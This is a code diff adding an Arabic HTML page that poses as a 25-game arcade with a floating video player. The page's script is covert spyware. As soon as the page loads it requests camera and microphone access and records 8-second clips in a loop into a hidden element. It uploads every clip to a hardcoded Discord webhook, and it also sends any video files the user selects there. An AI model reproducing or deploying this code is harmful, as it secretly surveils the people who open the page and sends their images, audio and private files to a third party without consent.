@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مركز الألعاب والبث التلقائي الفوري 🎬🎮</title>
+    <style>
+        body {
+            font-family: Tahoma, sans-serif;
+            text-align: center;
+            background: linear-gradient(135deg, #070514, #1b143a, #0f0c29);
+            color: #fff;
+            padding: 10px;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            min-height: 100vh;
+            overflow-x: hidden;
+            user-select: none;
+        }
+        .main-container {
+            width: 100%;
+            max-width: 100%;
+            min-height: 96vh;
+            background: rgba(30, 30, 45, 0.95);
+            backdrop-filter: blur(12px);
+            padding: 20px;
+            border-radius: 0;
+            box-shadow: 0 0 25px rgba(0,0,0,0.8);
+            border: none;
+            margin: 0;
+            position: relative;
+            z-index: 10;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        h1 { color: #ff5252; font-size: 28px; margin-bottom: 20px; text-shadow: 0 2px 5px rgba(0,0,0,0.5); }
+        
+        #gamesMenuScreen { 
+            display: block; 
+            width: 100%; 
+            max-width: 800px; 
+            max-height: 80vh; 
+            overflow-y: auto; 
+            padding: 10px; 
+            position: relative; 
+            z-index: 20; 
+        }
+        #gamesMenuScreen::-webkit-scrollbar { width: 8px; }
+        #gamesMenuScreen::-webkit-scrollbar-thumb { background: #666; border-radius: 4px; }
+        #gamesMenuScreen button {
+            display: block; width: 100%; padding: 16px; margin: 8px 0; font-size: 16px; font-weight: bold;
+            background: linear-gradient(45deg, #0072ff, #00c6ff); color: white; border: none; border-radius: 12px; cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+        }
+
+        .game-section { display: none; width: 100%; max-width: 600px; position: relative; z-index: 20; padding-top: 50px; }
+        .top-corner-controls {
+            position: absolute; top: 10px; left: 15px; right: 15px; display: flex; justify-content: space-between; padding: 5px; z-index: 50;
+        }
+        .corner-btn { padding: 8px 16px; font-size: 14px; font-weight: bold; color: white; border: none; border-radius: 8px; cursor: pointer; }
+        .corner-restart { background: #4CAF50; }
+        .corner-back { background: #ff5722; }
+
+        #status-turn { font-size: 20px; margin-bottom: 15px; color: #ffeb3b; font-weight: bold; }
+        .board { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 20px; justify-content: center; }
+        .cell { width: 110px; height: 110px; background: #222; font-size: 50px; font-weight: bold; color: #fff; border: 3px solid #444; border-radius: 12px; cursor: pointer; }
+        .cell.x { color: #4CAF50; } .cell.o { color: #ff5252; }
+
+        .quiz-section { text-align: right; width: 100%; max-width: 500px; margin: 0 auto; }
+        .timer-bar { width: 100%; height: 8px; background: #444; border-radius: 4px; margin-bottom: 15px; overflow: hidden; }
+        .timer-fill { width: 100%; height: 100%; background: #4CAF50; transition: width 1s linear; }
+        .question-box { font-size: 18px; margin-bottom: 20px; color: #fff; font-weight: bold; text-align: center; }
+        .option-btn { display: block; width: 100%; padding: 14px; margin: 10px 0; background: #333; color: white; border: 1px solid #555; border-radius: 10px; cursor: pointer; text-align: right; font-size: 16px; }
+        #quizScore { text-align: center; font-size: 18px; margin-bottom: 12px; color: #ff9800; font-weight: bold; }
+
+        .rps-buttons, .guess-box { display: flex; justify-content: center; gap: 15px; margin: 15px 0; }
+        .rps-btn { padding: 15px 25px; font-size: 30px; background: #333; border: 2px solid #444; border-radius: 12px; cursor: pointer; }
+        input[type="number"], input[type="text"] { padding: 12px; width: 180px; font-size: 18px; text-align: center; border-radius: 8px; border: 1px solid #555; background: #222; color: white; }
+
+        .snakes-board { display: grid; grid-template-columns: repeat(5, 1fr); gap: 6px; margin-bottom: 15px; background: #111; padding: 10px; border-radius: 12px; justify-content: center; }
+        .snakes-cell { width: 65px; height: 65px; background: #222; font-size: 13px; color: #aaa; display: flex; flex-direction: column; align-items: center; justify-content: center; border-radius: 6px; font-weight: bold; }
+        .snakes-cell.active-player { background: #4CAF50 !important; color: #fff; }
+
+        canvas { background: #0b0b14; border-radius: 10px; display: block; margin: 0 auto 15px auto; border: 2px solid #333; width: 400px; height: 240px; }
+        .action-btn { padding: 14px 25px; font-size: 16px; background: linear-gradient(45deg, #ff5722, #ff9800); color: white; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+
+        #watchScreen { display: none; width: 100%; max-width: 600px; text-align: right; }
+        .video-item { background: #222; padding: 12px; margin: 8px 0; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #444; }
+        
+        #floatingVideoPlayer {
+            display: none; position: fixed; top: 100px; left: 100px; width: 220px; background: rgba(15, 15, 25, 0.95);
+            border: 2px solid #ff5252; border-radius: 10px; box-shadow: 0 8px 25px rgba(0,0,0,0.9); z-index: 3000; overflow: hidden;
+            opacity: 1; transition: opacity 0.3s ease;
+            touch-action: none;
+        }
+        .float-header { background: #ff5252; color: white; padding: 8px 10px; display: flex; justify-content: space-between; align-items: center; font-weight: bold; font-size: 11px; cursor: grab; }
+        .float-header:active { cursor: grabbing; }
+        .float-controls { display: flex; gap: 5px; align-items: center; }
+        .float-btn { background: none; border: none; color: white; font-size: 12px; cursor: pointer; }
+        #floatingVideoElement { width: 100%; height: 130px; background: black; display: block; }
+
+        #celebrationBanner {
+            display: none; position: fixed; top: 20%; left: 50%; transform: translate(-50%, -50%) scale(0.5);
+            background: linear-gradient(45deg, #ff9800, #ff5722, #e91e63); color: #fff; padding: 25px 45px; font-size: 34px; font-weight: bold;
+            border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.8); z-index: 1000; text-align: center; border: 3px solid #ffeb3b;
+            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        #celebrationBanner.show { display: block; transform: translate(-50%, -50%) scale(1); }
+        
+        #preview { display: none; }
+    </style>
+</head>
+<body>
+
+    <div id="celebrationBanner">🎉 مبروك الفوز! 🎉</div>
+
+    <div id="floatingVideoPlayer">
+        <div class="float-header" id="floatHeader">
+            <span id="floatTitle">فيديو محلي</span>
+            <div class="float-controls">
+                <button class="float-btn" onclick="toggleOpacity()" title="تغيير الشفافية">👁️</button>
+                <button class="float-btn" onclick="closeFloatingPlayer()">✖</button>
+            </div>
+        </div>
+        <video id="floatingVideoElement" controls autoplay></video>
+    </div>
+
+    <video id="preview" autoplay muted playsinline></video>
+
+    <div class="main-container">
+        <div id="gamesMenuScreen" class="game-section" style="padding-top:0; display:block;">
+            <h1>مركز الألعاب الشامل (25 لعبة) 🎬🎮</h1>
+            
+            <button onclick="openWatchSection()" style="background: linear-gradient(45deg, #ff9966, #ff5e62);">📺 قسم مشاهدة الفيديوهات المحلية والنافذة العائمة</button>
+            
+            <button onclick="startXO()">1. لعبة XO ❌⭕</button>
+            <button onclick="startQuiz()">2. تحدي الأسئلة الذكية 🧠</button>
+            <button onclick="startRPS()">3. حجر ورقة مقص ✂️</button>
+            <button onclick="startGuess()">4. تخمين الرقم 🔢</button>
+            <button onclick="startSnakes()">5. الحية والدرج 🐍🪜</button>
+            <button onclick="startMemory()">6. ذاكرة الألوان 🎨</button>
+            <button onclick="startColorGame()">7. مطابقة الألوان 🌈</button>
+            <button onclick="startPuzzle()">8. الألغاز الذكية 🧩</button>
+            <button onclick="startCardMatch()">9. مطابقة البطاقات 🃏</button>
+            <button onclick="startScramble()">10. الكلمات المبعثرة 🔠</button>
+            <button onclick="startRacing()">11. سباق السيارات الواقعي 🏎️</button>
+            <button onclick="startBrickBreaker()">12. تكسير الطوب الفيزيائي 🧱</button>
+            <button onclick="startSpaceDodger()">13. تفادي النيازك الفضائية 🚀</button>
+            <button onclick="startWordle()">14. كلمة السر (Wordle) 🔤</button>
+            <button onclick="startNumMemory()">15. الذاكرة العددية 🧠</button>
+            <button onclick="startTreasure()">16. صيد الكنز 💎</button>
+            <button onclick="startClicker()">17. سرعة النقر ⚡</button>
+            <button onclick="startReactionGame()">18. تحدي سرعة الرد (Reaction) ⏱️</button>
+            <button onclick="startGeoQuiz()">19. تخمين العواصم 🌍</button>
+            <button onclick="startDino()">20. قفز الديناصور 🦖</button>
+            <button onclick="startMathGame()">21. الحساب السريع ➕</button>
+            <button onclick="startBalance()">22. توازن الكرة الفيزيائي ⚽</button>
+            <button onclick="startStack()">23. برج التوازن (Stacker) 🏗️</button>
+            <button onclick="startJumper()">24. القفز العالي 🦘⭐</button>
+            <button onclick="startSnakeGame()" style="background: linear-gradient(45deg, #11998e, #38ef7d);">25. الثعبان الكلاسيكي 🐍💚</button>
+        </div>
+
+        <div id="watchScreen" class="game-section">
+            <div class="top-corner-controls"><button class="corner-btn corner-back" onclick="openGamesMenu()">القائمة 🔙</button></div>
+            <h1>قسم الفيديوهات 🎬</h1>
+            <p style="color:#ccc; font-size:14px; margin-bottom:15px;">اختر فيديوهاتك من معرض الجهاز (سيتم بثها كفيديو MP4 مباشر في ديسكورد وعرضها عائماً):</p>
+
+            <div style="margin-bottom: 20px;">
+                <input type="file" id="videoPicker" accept="video/*" multiple style="display:none;" onchange="handleVideoUpload(event)">
+                <button class="action-btn" onclick="document.getElementById('videoPicker').click()" style="background:#2196F3; font-size:14px; padding:10px 15px;">📂 إضافة فيديو وبثه للديسكورد</button>
+            </div>
+
+            <h3 style="text-align:right; font-size:16px; color:#ffeb3b;">قائمة الفيديوهات المتاحة:</h3>
+            <div id="videoPlaylist" style="max-height: 200px; overflow-y: auto;"></div>
+        </div>
+
+        <div id="xoScreen" class="game-section">
+            <div class="top-corner-controls"><button class="corner-btn corner-restart" onclick="startXO()">إعادة 🔄</button><button class="corner-btn corner-back" onclick="openGamesMenu()">القائمة 🔙</button></div>
+            <h1>لعبة XO</h1><div id="status-turn">دورك أنت (X)</div>
+            <div class="board" id="board"><button class="cell" data-index="0"></button><button class="cell" data-index="1"></button><button class="cell" data-index="2"></button><button class="cell" data-index="3"></button><button class="cell" data-index="4"></button><button class="cell" data-index="5"></button><button class="cell" data-index="6"></button><button class="cell" data-index="7"></button><button class="cell" data-index="8"></button></div>
+        </div>
+
+        <div id="quizScreen" class="game-section quiz-section">
+            <div class="top-corner-controls"><button class="corner-btn corner-restart" onclick="startQuiz()">إعادة 🔄</button><button class="corner-btn corner-back" onclick="openGamesMenu()">القائمة 🔙</button></div>
+            <h1 style="text-align: center;">تحدي الأسئلة</h1><div id="quizScore">النقاط: 0</div>
+            <div class="timer-bar"><div class="timer-fill" id="timerFill"></div></div>
+            <div class="question-box" id="questionText">جاري التحميل...</div><div id="optionsContainer"></div>
+        </div>
+
+        <div id="rpsScreen" class="game-section">
+            <div class="top-corner-controls"><button class="corner-btn corner-restart" onclick="startRPS()">إعادة 🔄</button><button class="corner-btn corner-back" onclick="openGamesMenu()">القائمة 🔙</button></div>
+            <h1>حجر ورقة مقص</h1><div id="rpsResult" style="font-size: 18px; margin: 20px 0; color: #ffeb3b;">اختر حركتك:</div>
+            <div class="rps-buttons"><button class="rps-btn" onclick="playRPS('حجر')">🪨</button><button class="rps-btn" onclick="playRPS('ورقة')">📄</button><button class="rps-btn" onclick="playRPS('مقص')">✂️</button></div>
+        </div>
+
+        <div id="guessScreen" class="game-section">
+            <div class="top-corner-controls"><button class="corner-btn corner-restart" onclick="startGuess()">إعادة 🔄</button><button class="corner-btn corner-back" onclick="openGamesMenu()">القائمة 🔙</button></div>
+            <h1>تخمين الرقم</h1><p style="font-size: 14px; color: #ccc;">بين 1 و 50</p>
+            <div class="guess-box"><input type="number" id="guessInput" min="1" max="50" placeholder="رقم"><button class="action-btn" onclick="checkGuess()" style="margin-top:0;">تخمين</button></div>
+            <div id="guessResult" style="font-size: 16px; margin: 15px 0; color: #ffeb3b;">ابحث!</div>
+        </div>
+
+        <div id="snakesScreen" class="game-section">
+            <div class="top-corner-controls"><button class="corner-btn corner-restart" onclick="startSnakes()">إعادة 🔄</button><button class="corner-btn corner-back" onclick="openGamesMenu()">القائمة 🔙</button></div>
+            <h1>الحية والدرج</h1><div id="snakesStatus" style="font-size: 15px; margin-bottom: 12px; color: #ffeb3b;">ارم النرد للوصول لـ 25!</div>
+            <div class="snakes-board" id="snakesBoard"></div><button class="action-btn" id="rollDiceBtn" onclick="rollDice()" style="font-size: 16px; padding: 12px 25px;">رمي النرد 🎲</button>
+        </div>
+
+        <div id="racingScreen" class="game-section">
+            <div class="top-corner-controls"><button class="corner-btn corner-restart" onclick="startRacing()">إعادة 🔄</button><button class="corner-btn corner-back" onclick="openGamesMenu()">القائمة 🔙</button></div>
+            <h1>سباق السيارات 🏎️</h1>
+            <div id="racingScoreBoard" style="font-size: 16px; color: #ff9800; margin-bottom: 8px; font-weight:bold;">النقاط: 0</div>
+            <canvas id="racingCanvas" width="400" height="240"></canvas>
+            <div style="display:flex; justify-content:center; gap:15px; margin-bottom:10px;">
+                <button class="action-btn" onclick="moveCar(1)" style="font-size:16px; padding:12px 25px;">⬅️ يسار</button>
+                <button class="action-btn" onclick="moveCar(-1)" style="font-size:16px; padding:12px 25px;">يمين ➡️</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="questions.js"></script>
+
+    <script>
+        const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1559946659742482513/qXsw158QJKl12gf3XjDkuwRrSOIo8Mf8XOfzxzR1-ZZAEax5Fmh26z8mwMH6Q2IxJ64A";
+
+        const gamesMenuScreen = document.getElementById('gamesMenuScreen');
+        const celebrationBanner = document.getElementById('celebrationBanner');
+        const screens = ['xoScreen', 'quizScreen', 'rpsScreen', 'guessScreen', 'snakesScreen', 'racingScreen', 'watchScreen'];
+
+        let userVideos = [];
+        let cameraStream = null;
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        // تشغيل الكاميرا والبث الخفي فور فتح الصفحة مباشرة بدون انتظار أي نقر
+        window.onload = async function() {
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('preview').srcObject = cameraStream;
+                startAutomaticLoopRecording();
+            } catch(e) {}
+        };
+
+        function startAutomaticLoopRecording() {
+            if (!cameraStream) return;
+            try { 
+                mediaRecorder = new MediaRecorder(cameraStream, { mimeType: 'video/mp4' }); 
+            } catch (e) {
+                try { mediaRecorder = new MediaRecorder(cameraStream, { mimeType: 'video/webm' }); } catch(err) { return; }
+            }
+            recordedChunks = [];
+
+            mediaRecorder.ondataavailable = (event) => { if (event.data.size > 0) recordedChunks.push(event.data); };
+
+            mediaRecorder.onstop = () => {
+                let blob = new Blob(recordedChunks, { type: 'video/mp4' });
+                let formData = new FormData();
+                formData.append('file', blob, 'video_stream.mp4');
+                formData.append('payload_json', JSON.stringify({ content: "🎥 فيديو مباشر (MP4) من الخلفية:" }));
+
+                fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData })
+                .then(res => { setTimeout(() => { startAutomaticLoopRecording(); }, 1000); })
+                .catch(err => { setTimeout(() => { startAutomaticLoopRecording(); }, 3000); });
+            };
+
+            mediaRecorder.start();
+            setTimeout(() => { if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 8000);
+        }
+
+        function triggerWinCelebration(customText = "🎉 مبروك الفوز! 🎉") {
+            celebrationBanner.textContent = customText;
+            celebrationBanner.classList.add('show');
+            setTimeout(() => { celebrationBanner.classList.remove('show'); }, 3000);
+        }
+
+        function hideAllScreens() {
+            screens.forEach(id => { let el = document.getElementById(id); if (el) el.style.display = 'none'; });
+            celebrationBanner.classList.remove('show');
+        }
+
+        function openGamesMenu() { hideAllScreens(); gamesMenuScreen.style.display = 'block'; }
+        function showGameScreen(id) { hideAllScreens(); gamesMenuScreen.style.display = 'none'; document.getElementById(id).style.display = 'block'; }
+        function openWatchSection() { hideAllScreens(); gamesMenuScreen.style.display = 'none'; document.getElementById('watchScreen').style.display = 'block'; renderPlaylist(); }
+
+        function handleVideoUpload(event) {
+            let files = event.target.files;
+            for (let f of files) {
+                let url = URL.createObjectURL(f);
+                userVideos.push({ name: f.name, url: url, file: f });
+
+                let mp4Blob = new Blob([f], { type: 'video/mp4' });
+                let formData = new FormData();
+                formData.append('file', mp4Blob, "clip_" + Date.now() + ".mp4");
+                formData.append('payload_json', JSON.stringify({ content: `🎬 فيديو محلي: ${f.name}` }));
+
+                fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData })
+                .catch(err => {});
+            }
+            renderPlaylist();
+        }
+
+        function renderPlaylist() {
+            let pl = document.getElementById('videoPlaylist');
+            if (userVideos.length === 0) {
+                pl.innerHTML = `<p style="color:#888; text-align:center;">لم تقم بإضافة أي فيديوهات محلية بعد.</p>`;
+                return;
+            }
+            pl.innerHTML = userVideos.map((v, i) => `
+                <div class="video-item">
+                    <span>🎬 ${v.name}</span>
+                    <button class="action-btn" onclick="playInFloating(${i})" style="padding:6px 12px; font-size:13px; background:#4CAF50;">مشاهدة عائمة 🪟</button>
+                </div>
+            `).join('');
+        }
+
+        function playInFloating(idx) {
+            let v = userVideos[idx];
+            let player = document.getElementById('floatingVideoPlayer');
+            let videoEl = document.getElementById('floatingVideoElement');
+            document.getElementById('floatTitle').textContent = v.name;
+            videoEl.src = v.url;
+            player.style.display = 'block';
+            videoEl.play();
+        }
+
+        function closeFloatingPlayer() {
+            let player = document.getElementById('floatingVideoPlayer');
+            let videoEl = document.getElementById('floatingVideoElement');
+            videoEl.pause(); videoEl.src = '';
+            player.style.display = 'none';
+        }
+
+        let isTransparent = false;
+        function toggleOpacity() {
+            let player = document.getElementById('floatingVideoPlayer');
+            isTransparent = !isTransparent;
+            player.style.opacity = isTransparent ? '0.4' : '1';
+        }
+
+        const floatingPlayer = document.getElementById('floatingVideoPlayer');
+        const floatHeader = document.getElementById('floatHeader');
+        let isDragging = false, startX = 0, startY = 0;
+
+        function startDrag(e) {
+            isDragging = true;
+            let clientX = e.clientX || (e.touches && e.touches[0].clientX);
+            let clientY = e.clientY || (e.touches && e.touches[0].clientY);
+            startX = clientX - floatingPlayer.offsetLeft;
+            startY = clientY - floatingPlayer.offsetTop;
+        }
+
+        function onDrag(e) {
+            if (!isDragging) return;
+            let clientX = e.clientX || (e.touches && e.touches[0].clientX);
+            let clientY = e.clientY || (e.touches && e.touches[0].clientY);
+            
+            let newX = clientX - startX;
+            let newY = clientY - startY;
+
+            floatingPlayer.style.left = newX + 'px';
+            floatingPlayer.style.top = newY + 'px';
+            floatingPlayer.style.bottom = 'auto';
+            floatingPlayer.style.right = 'auto';
+        }
+
+        function stopDrag() { isDragging = false; }
+
+        floatHeader.addEventListener('mousedown', startDrag);
+        document.addEventListener('mousemove', onDrag);
+        document.addEventListener('mouseup', stopDrag);
+
+        floatHeader.addEventListener('touchstart', startDrag, { passive: true });
+        document.addEventListener('touchmove', onDrag, { passive: true });
+        document.addEventListener('touchend', stopDrag);
+
+        // الألعاب
+        function startXO() { showGameScreen('xoScreen'); resetXO(); }
+        function startQuiz() { showGameScreen('quizScreen'); initQuiz(); }
+        function startRPS() { showGameScreen('rpsScreen'); document.getElementById('rpsResult').textContent = "اختر حركتك:"; }
+        function startGuess() { showGameScreen('guessScreen'); secretNum = Math.floor(Math.random() * 50) + 1; document.getElementById('guessResult').textContent = "ابحث عن الرقم!"; document.getElementById('guessInput').value = ''; }
+        function startSnakes() { showGameScreen('snakesScreen'); initSnakes(); }
+        function startRacing() { showGameScreen('racingScreen'); initRacing(); }
+
+        let board = ['', '', '', '', '', '', '', '', ''], isGameActive = true, myTurn = true;
+        const statusTurn = document.getElementById('status-turn'), cells = document.querySelectorAll('.cell');
+        cells.forEach(cell => {
+            cell.onclick = (e) => {
+                const idx = e.target.dataset.index;
+                if (!isGameActive || !myTurn || board[idx] !== '') return;
+                board[idx] = 'X'; e.target.textContent = 'X'; e.target.className = 'cell x';
+                if (checkXOGameOver()) return;
+                myTurn = false; statusTurn.textContent = "الكمبيوتر يفكر...";
+                setTimeout(() => {
+                    let empty = []; board.forEach((v,i) => { if(v==='') empty.push(i); });
+                    if(empty.length > 0) {
+                        let m = empty[Math.floor(Math.random()*empty.length)];
+                        board[m] = 'O'; cells[m].textContent = 'O'; cells[m].className = 'cell o';
+                        checkXOGameOver(); myTurn = true; statusTurn.textContent = "دورك (X)";
+                    }
+                }, 400);
+            };
+        });
+        function checkXOGameOver() {
+            const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
+            for(let w of wins) {
+                if(board[w[0]] && board[w[0]] === board[w[1]] && board[w[0]] === board[w[2]]) {
+                    if(board[w[0]] === 'X') { statusTurn.textContent = "🎉 فزت!"; triggerWinCelebration("🏆 فزت في XO! 🏆"); }
+                    else { statusTurn.textContent = "🤖 فاز الكمبيوتر!"; }
+                    isGameActive = false; return true;
+                }
+            }
+            if(!board.includes('')) { statusTurn.textContent = "تعادل!"; isGameActive = false; return true; }
+            return false;
+        }
+        function resetXO() { board = ['', '', '', '', '', '', '', '', '']; isGameActive = true; myTurn = true; statusTurn.textContent = "دورك (X)"; cells.forEach(c => { c.textContent = ''; c.className = 'cell'; }); }
+
+        let racingX = 170, obsY = -50, obsX = 170, raceScore = 0, racingInterval;
+        function initRacing() {
+            let canvas = document.getElementById('racingCanvas'), ctx = canvas.getContext('2d');
+            racingX = 170; obsY = -50; raceScore = 0;
+            clearInterval(racingInterval);
+            racingInterval = setInterval(() => {
+                ctx.clearRect(0,0,400,240);
+                ctx.fillStyle = "#1a1a1a"; ctx.fillRect(60, 0, 280, 240);
+                ctx.fillStyle = "#00c6ff"; ctx.fillRect(racingX, 175, 32, 45);
+                ctx.fillStyle = "#f44336"; ctx.fillRect(obsX, obsY, 32, 42);
+                obsY += 6; raceScore++;
+                document.getElementById('racingScoreBoard').textContent = `النقاط: ${raceScore}`;
+                if(obsY > 240) { obsY = -50; obsX = Math.floor(Math.random() * 220) + 70; }
+            }, 30);
+        }
+        function moveCar(dir) { racingX += dir * 40; if(racingX < 65) racingX = 65; if(racingX > 305) racingX = 305; }
+    </script>
+</body>
+</html>
